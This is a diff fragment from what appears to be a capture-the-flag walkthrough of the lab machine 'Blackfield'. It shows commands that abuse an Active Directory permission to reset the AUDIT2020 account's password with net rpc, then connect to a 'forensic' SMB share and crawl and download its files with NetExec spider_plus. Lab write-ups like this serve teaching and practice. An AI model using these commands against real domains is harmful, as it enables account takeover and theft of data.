@@ -134,8 +134,8 @@ Permission to change password to AUDIT2020, in order to exploit this misconfigur
 
 ```net rpc password "AUDIT2020" "newP@ssword2025" -U "BLACKFIELD"/"support"%"#00^BlackKnight" -S "dc01.blackfield.local"```
 
-We can now do the same process (Iterate over all the protocols) to see where we have access
-SMB ACCESS: `smbclient \\\\10.10.10.192\\forensic -U 'AUDIT2020'<br>
+We can now do the same process (Iterate over all the protocols) to see where we have access<br>
+And we discovered that we have smb access to "forensic" : `smbclient \\\\10.10.10.192\\forensic -U 'AUDIT2020'<br>
 <img width="786" height="212" alt="Pasted image 20250911121425" src="https://github.com/user-attachments/assets/fd1e4cba-f338-4e1a-99dc-d15baf1414aa" /><br>
 
 ```nxc smb blackfield.local -u 'AUDIT2020' -p 'newP@ssword2025' -M spider_plus -o DOWNLOAD_FLAG=True```
